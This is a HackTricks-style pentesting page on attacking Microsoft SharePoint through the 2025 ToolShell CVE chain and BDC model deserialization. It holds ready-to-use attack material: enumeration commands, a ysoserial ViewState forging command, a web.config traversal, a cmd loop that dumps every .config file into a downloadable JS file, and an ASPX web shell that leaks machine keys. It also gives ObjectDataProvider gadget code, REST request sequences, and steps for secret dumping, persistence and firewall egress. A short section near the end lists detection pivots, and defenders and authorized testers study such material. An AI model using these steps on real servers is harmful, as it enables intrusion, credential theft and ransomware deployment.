---
title: "Microsoft Sharepoint"
source: hacktricks.wiki
source_url: https://hacktricks.wiki/network-services-pentesting/pentesting-web/microsoft-sharepoint.html
fetched_at: 2026-09-20T09:50:19Z
license: unspecified
category: network
---

## 1. Quick enumeration

```
# favicon hash and keywords
curl -s https://<host>/_layouts/15/images/SharePointHome.png
curl -s https://<host>/_vti_bin/client.svc | file -  # returns WCF/XSI
# version leakage (often in JS)
curl -s https://<host>/_layouts/15/init.js | grep -i "spPageContextInfo"
# interesting standard paths
/_layouts/15/ToolPane.aspx               # vulnerable page used in 2025 exploit chain
/_vti_bin/Lists.asmx                     # legacy SOAP service
/_catalogs/masterpage/Forms/AllItems.aspx
# enumerate sites & site-collections (requires at least Anonymous)
python3 Office365-ADFSBrute/SharePointURLBrute.py -u https://<host>
```
## 2. 2025 exploit chain (a.k.a. “ToolShell”)

CISA’s technical analysis documents ToolShell exploitation artifacts and detection guidance that can be used to reproduce indicators safely in an authorized lab.[\[6\]](#references)

For exploit internals, the Securelist analysis walks through `ToolPane.aspx`, the relevant SharePoint code path, and observed payload behavior.<sup>[\[7\]](#references)</sup> Prefer validated analyses over speculative GitHub repositories: Eye Security explicitly removed links to unverified ToolShell PoCs, noting that the effective chain does not require a file write.[\[8\]](#references)

### 2.1 CVE-2025-49704 – Code Injection on ToolPane.aspx

`/_layouts/15/ToolPane.aspx?PageView=…&DefaultWebPartId=<payload>` allows arbitrary *Server-Side Include* code to be injected in the page which is later compiled by ASP.NET.  An attacker can embed C# that executes `Process.Start()` and drop a malicious ViewState.[\[1\]](#references)[\[2\]](#references)

### 2.2 CVE-2025-49706 – Improper Authentication Bypass

The same page trusts the **X-Forms_BaseUrl** header to determine the site context.  By pointing it to `/_layouts/15/`,  MFA/SSO enforced at the root site can be bypassed **unauthenticated**.[\[1\]](#references)[\[2\]](#references)

### 2.3 CVE-2025-53770 – Unauthenticated ViewState Deserialization → RCE

Once the attacker controls a gadget in `ToolPane.aspx` they can post an **unsigned** (or MAC-only) `__VIEWSTATE` value that triggers .NET deserialization inside *w3wp.exe* leading to code execution.[\[1\]](#references)[\[4\]](#references)

If signing is enabled, steal the **ValidationKey/DecryptionKey** from any `web.config` (see 2.4) and forge the payload with *ysoserial.net* or *ysodom*:[\[1\]](#references)

```
ysoserial.exe -g TypeConfuseDelegate -f Json.Net -o raw -c "cmd /c whoami" |
    ViewStateGenerator.exe --validation-key <hex> --decryption-key <hex> -o payload.txt
```
For an in-depth explanation on abusing ASP.NET ViewState read:

[Exploiting __VIEWSTATE without knowing the secrets](../../pentesting-web/deserialization/exploiting-__viewstate-parameter.html)

### 2.4 CVE-2025-53771 – Path Traversal / web.config Disclosure

Sending a crafted `Source` parameter to `ToolPane.aspx` (e.g. `../../../../web.config`) returns the targeted file, allowing leakage of:[\[1\]](#references)[\[4\]](#references)

- `<machineKey validationKey="…" decryptionKey="…">` ➜ forge ViewState / ASPXAUTH cookies
- connection strings & secrets.

### 2.5 ToolShell workflow observed in Ink Dragon intrusions

Check Point mapped how Ink Dragon operationalised the ToolShell chain months before Microsoft shipped fixes:[\[5\]](#references)

- **Header spoofing for auth bypass** – the actor sends POSTs to`/_layouts/15/ToolPane.aspx` with`Referer: https://<victim>/_layouts/15/` plus a fake`X-Forms_BaseUrl` . Those headers convince SharePoint that the request originates from a trusted layout and completely skip front-door authentication (CVE-2025-49706/CVE-2025-53771).
- **Serialized gadget in the same request** – the body includes attacker-controlled ViewState/ToolPart data that reaches the vulnerable server-side formatter (CVE-2025-49704/CVE-2025-53770). The payload is usually a ysoserial.net chain that runs inside`w3wp.exe` without ever touching disk.
- **Internet-scale scanning** – telemetry from July 2025 shows them enumerating every reachable`/_layouts/15/ToolPane.aspx` endpoint and replaying a dictionary of leaked`<machineKey>` pairs. Any site that copied a sample`validationKey` from documentation can be compromised even if it is otherwise fully patched (see the ViewState page for the signing workflow).
- **Immediate staging** – successful exploitation drops a loader or PowerShell stager that: (1) dumps every`web.config` , (2) plants an ASPX webshell for contingency access, and (3) schedules a local Potato privesc to escape the IIS worker.

## 3. Post-exploitation recipes observed in the wild

### 3.1 Exfiltrate every *.config* file (variation-1)

*.config*file (variation-1)

```
cmd.exe /c for /R C:\inetpub\wwwroot %i in (*.config) do @type "%i" >> "C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\debug_dev.js"
```
The resulting `debug_dev.js` can be downloaded anonymously and contains **all** sensitive configuration.[\[1\]](#references)

### 3.2 Deploy a Base64-encoded ASPX web shell (variation-2)

```
powershell.exe -EncodedCommand <base64>
```
Decoded payload example (shortened):

```
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e){
        Response.Write(MachineKey.ValidationKey);
        // echo secrets or invoke cmd
    }
</script>
```
Written to:

```
C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\16\TEMPLATE\LAYOUTS\spinstall0.aspx
```
The shell exposes endpoints to **read / rotate machine keys** which allows forging ViewState and ASPXAUTH cookies across the farm.[\[1\]](#references)

### 3.3 Obfuscated variant (variation-3)

Same shell but:[\[1\]](#references)

- dropped under `...\15\TEMPLATE\LAYOUTS\`
- variable names reduced to single letters
- `Thread.Sleep(<ms>)` added for sandbox-evasion & timing-based AV bypass.

### 3.4 AK47C2 multi-protocol backdoor & X2ANYLOCK ransomware (observed 2025-2026)

Recent incident-response investigations (Unit42 “Project AK47”) show how attackers leverage the ToolShell chain **after initial RCE** to deploy a dual-channel C2 implant and ransomware in SharePoint environments:[\[3\]](#references)

#### AK47C2 – `dnsclient` variant

`dnsclient` variant
-
Hard-coded DNS server: `10.7.66.10` communicating with authoritative domain`update.updatemicfosoft.com` .
-
Messages are JSON objects XOR-encrypted with the static key `VHBD@H` , hex-encoded and embedded as**sub-domain labels** .```
{"cmd":"<COMMAND>","cmd_id":"<ID>"}
```
-
Long queries are chunked and prefixed with `s` , then re-assembled server-side.
-
Server replies in TXT records carrying the same XOR/hex scheme: ```
{"cmd":"<COMMAND>","cmd_id":"<ID>","type":"result","fqdn":"<HOST>","result":"<OUTPUT>"}
```
-
Version 202504 introduced a simplified format `<COMMAND>::<SESSION_KEY>` and chunk markers`1` ,`2` ,`a` .

#### AK47C2 – `httpclient` variant

`httpclient` variant
- Re-uses the exact JSON & XOR routine but sends the hex blob in the **HTTP POST body** via`libcurl` (`CURLOPT_POSTFIELDS` , etc.).
- Same task/result workflow allowing:
  - Arbitrary shell command execution.
  - Dynamic sleep interval and kill-switch instructions.

#### X2ANYLOCK ransomware

-
64-bit C++ payload loaded through DLL side-loading (see below).
-
Employs AES-CBC for file data + RSA-2048 to wrap the AES key, then appends the extension `.x2anylock` .
-
Recursively encrypts local drives and discovered SMB shares; skips system paths.
-
Drops clear-text note `How to decrypt my data.txt` embedding a static**Tox ID** for negotiations.
-
Contains an internal **kill-switch** :```
if (file_mod_time >= "2026-06-06") exit(0);
```

#### [DLL side-loading chain](#dll-side-loading-chain)

1. Attacker writes `dllhijacked.dll` /`My7zdllhijacked.dll` next to a legitimate`7z.exe` .
2. SharePoint-spawned `w3wp.exe` launches`7z.exe` , which loads the malicious DLL because of Windows search order, invoking the ransomware entrypoint in memory.
3. A separate LockBit loader observed (`bbb.msi` ➜`clink_x86.exe` ➜`clink_dll_x86.dll` ) decrypts shell-code and performs**DLL hollowing** into`d3dl1.dll` to run LockBit 3.0.

[!INFO] The same static Tox ID found in X2ANYLOCK appears in leaked LockBit databases, suggesting affiliate overlap.

### [3.5 Turning SharePoint loot into lateral movement](#35-turning-sharepoint-loot-into-lateral-movement)

- **Decrypt every protected section** – once seated on the web tier, abuse`aspnet_regiis.exe -px "connectionStrings" C:\\temp\\conn.xml -pri` (or`-px "appSettings"` ) to dump the clear-text secrets hiding behind`<connectionStrings configProtectionProvider="RsaProtectedConfigurationProvider">` . Ink Dragon repeatedly harvested SQL logins, SMTP relays and custom service credentials this way.<sup>[\[5\]](#references)</sup>
- **Recycle app-pool accounts across farms** – many enterprises reuse the same domain account for`IIS APPPOOL\SharePoint` on every front-end. After decrypting`identity impersonate="..."` blocks or reading`ApplicationHost.config` , test the credential over SMB/RDP/WinRM to every sibling server. In multiple incidents the account was also a local administrator, allowing`psexec` ,`sc create` , or scheduled-task staging without triggering password sprays.<sup>[\[5\]](#references)</sup>
- **Abuse leaked `<machineKey>` values internally** – even if the internet perimeter gets patched, reusing the same`validationKey` /`decryptionKey` allows lateral ViewState exploitation between internal SharePoint zones that trust each other.

### [3.6 Persistence patterns witnessed in 2025 intrusions](#36-persistence-patterns-witnessed-in-2025-intrusions)

- **Scheduled tasks** – a one-shot task named`SYSCHECK` (or other health-themed names) is created with`/ru SYSTEM /sc once /st <hh:mm>` to bootstrap the next-stage loader (commonly a renamed`conhost.exe` ). Because it is run-once, telemetry often misses it unless historic task XML is preserved.<sup>[\[5\]](#references)</sup>
- **Masqueraded services** – services such as`WindowsTempUpdate` ,`WaaSMaintainer` , or`MicrosoftTelemetryHost` are installed via`sc create` pointing at the sideloading triad directory. The binaries keep their original AMD/Realtek/NVIDIA signatures but are renamed to match Windows components; comparing the on-disk name with the`OriginalFileName` PE field is a quick integrity check.<sup>[\[5\]](#references)</sup>

### [3.7 Host firewall downgrades for relay traffic](#37-host-firewall-downgrades-for-relay-traffic)

Ink Dragon routinely adds a permissive outbound rule that masquerades as Defender maintenance so ShadowPad/FinalDraft traffic can exit on any port:[\[5\]](#references)

```
netsh advfirewall firewall add rule name="Microsoft MsMpEng" dir=out action=allow program="C:\ProgramData\Microsoft\Windows Defender\MsMpEng.exe" enable=yes profile=any
```
Because the rule is created locally (not via GPO) and uses the legitimate Defender binary as `program=`, most SOC baselines ignore it, yet it opens **Any ➜ Any** egress.[\[5\]](#references)

## [4. BDC model metadata as a .NET object-construction sink](#4-bdc-model-metadata-as-a-net-object-construction-sink)

SharePoint Business Data Connectivity (BDC) models can act as XML object-graph descriptions rather than passive database schemas. A `TypeDescriptor` can name a .NET type and contain nested descriptors for its fields or properties. Older BDC research already showed that trusting model-defined method parameter types can expose attacker-controlled `XmlSerializer` streams, so `.bdcm` upload and execution permissions form a security boundary.[\[9\]](#references)

### [4.1 Unrestricted type resolution and reflective property assignment](#41-unrestricted-type-resolution-and-reflective-property-assignment)

For a `Database` LOB system, `DbTypeReflector.ResolveDotNetType()` sends names shorter than 15 characters through a limited base resolver, but passes names of 15 or more characters directly to `Type.GetType(name, throwOnError: true)`. Without an assembly/type allowlist, an assembly-qualified `TypeName` can therefore select classes available in the Global Assembly Cache. `DotNetTypeReflector.Instantiate()` then recursively constructs the nested descriptors, converts their default values, and assigns them through reflection. The important audit primitive is **attacker-selected type + recursive construction + reflected property setters**, even when no conventional formatter is present.[\[11\]](#references)

A property assignment may execute code rather than only store data. The `ObjectDataProvider` chain uses a nested `ProcessStartInfo` and `Process`; setting `ObjectInstance` refreshes the provider and invokes the method selected by `MethodName` on that object. The generic gadget internals are described on the [.NET deserialization page](../../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html).[\[10\]](#references)[\[11\]](#references)

```
var odp = new ObjectDataProvider { MethodName = "Start" };
var psi = new ProcessStartInfo {
    UseShellExecute = false,
    CreateNoWindow = true,
    FileName = "cmd.exe",
    Arguments = "/c whoami > C:\\Windows\\Temp\\bdc.txt"
};
var process = new Process { StartInfo = psi };
odp.ObjectInstance = process; // Refresh -> reflective Process.Start()
```
### [4.2 Store first, materialize later](#42-store-first-materialize-later)

Uploading the model only stores the graph. A useful trigger must reach default-value construction: a Client Object Model request containing `FindSpecificDefault` calls `CreateDefaultParameterInstancesInternal` and eventually `DotNetTypeReflector.Instantiate()`, so the dangerous setter runs before a useful database result is required. A compact request sequence is:[\[11\]](#references)

```
POST /_api/web/folders
{"__metadata":{"type":"SP.Folder"},"ServerRelativeUrl":"BusinessDataMetadataCatalog"}
POST /_api/web/GetFolderByServerRelativeUrl('BusinessDataMetadataCatalog')/Files/add(url='model.bdcm',overwrite=true)
POST /_vti_bin/client.svc/ProcessQuery
...
<Method Name="FindSpecificDefault" ... />
```
These requests normally require an authorized identity and a valid `X-RequestDigest`; an independent authentication bypass that supplies the Bearer token and digest converts the post-authentication primitive into an unauthenticated chain.[\[11\]](#references)

Do not assume one LOB type or gadget. An independent chain used a `DotNetAssembly` LOB to resolve and instantiate `System.Web.UI.LosFormatter`, then invoked its `Deserialize` instance method with a model-supplied default value. This demonstrates that the durable issue is unsafe type selection/materialization, not an `ObjectDataProvider` signature.[\[12\]](#references)

### [4.3 Detection pivots](#43-detection-pivots)

Correlate the following server, proxy, and endpoint signals rather than matching only one payload family:[\[11\]](#references)[\[12\]](#references)

- Creation of `BusinessDataMetadataCatalog` , followed by a`.bdcm` upload through`/_api/web/GetFolderByServerRelativeUrl(...)/Files/add` .
- `/_vti_bin/client.svc/ProcessQuery` bodies containing BDC entity identities and methods such as`FindSpecificDefault` .
- Unexpected assembly-qualified `TypeName` values, especially references to`ObjectDataProvider` ,`System.Diagnostics.Process` ,`ProcessStartInfo` , or`LosFormatter` .
- Unusual child processes of SharePoint’s `w3wp.exe` ; keep this process-tree signal even when the model uses a different LOB or gadget.

## [Related tricks](#related-tricks)

- IIS post-exploitation & web.config abuse:

[IIS - Internet Information Services](../../network-services-pentesting/pentesting-web/iis-internet-information-services.html)

## [References](#references)

Learn & practice AWS Hacking:**HackTricks Training AWS Red Team Expert (ARTE)**

Learn & practice GCP Hacking: **HackTricks Training GCP Red Team Expert (GRTE)**

Learn & practice Az Hacking: **HackTricks Training Azure Red Team Expert (AzRTE)**

Browse the [**full HackTricks Training catalog**](https://hacktricks-training.com/courses/).

## Support HackTricks

- Check the
[**subscription plans**](https://github.com/sponsors/carlospolop)!
**Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f), the [**telegram group**](https://t.me/peass), **follow** [**@hacktricks_live**](https://twitter.com/hacktricks_live) on **X/Twitter**, or check the [**LinkedIn page**](https://www.linkedin.com/company/hacktricks/) and [**YouTube channel**](https://www.youtube.com/@hacktricks_LIVE).
**Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
